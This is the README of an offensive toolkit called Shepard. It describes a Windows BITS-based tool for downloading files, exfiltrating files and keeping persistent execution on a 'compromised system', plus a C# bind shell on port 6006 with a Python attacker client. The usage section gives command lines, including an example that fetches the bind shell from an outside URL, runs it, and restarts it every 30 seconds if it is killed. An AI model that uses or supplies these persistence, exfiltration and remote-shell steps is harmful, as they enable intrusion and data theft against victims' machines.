# SHEPARD 

## BITS

This is a persistance tool using Windows Background Intelligent Transfer Service (BITS). 

### Functionality

File Download, File Exfiltration, File Download + Persistent Execution

### Usage 

Run shepard.exe as Administrator with the following command line arguments:
  
  `-d <remoteLocation> <writePath>` : regular file download to a local path of your choice
  
  `-e <remoteLocation> <localPath>` : regular file upload from a local path of your choice (only sends to IIS server, this is a limitation with BITS)
  
  `-dr <remoteLocation> <writePath> [optionalFileArgs]` :  file download to a path of your choice, and will attempt to maintain persitance. The downloaded file will attempt to run with optionalFileArgs and BITS will check back every 30 seconds to make sure the file is still running on the compromised system.
  
Running this executable with no arguments or an incorrect amount of arguments will cause shepard to exit cleanly.

## BINDSHELL

The server (victim) is written using C#. It listens on port 6006.

### Victim Usage 

Run shepardsbind_serv.exe with no arguments.

The client (attacker) is written using Python and takes one argument: the IP address of the victim's machine. 

### Server Usage

`shepardsbind_recv.py <victim's IP>`

Running shepardsbind_recv.py with no arguments will return an error.

## Using them in conjunction

The only executable that must be on the victim's machine is shepard.exe. Host the download bindshell executable to a publicly accessible place. 
Shepard will download and run the bindshell executable, and the user can now use the python reciever. If the shell is found and killed, it will restart after 30 seconds.

Example: `shepard.exe -dr http://location.com/shepardsbind_serv.exe C:\Users\Administrator\file.exe`
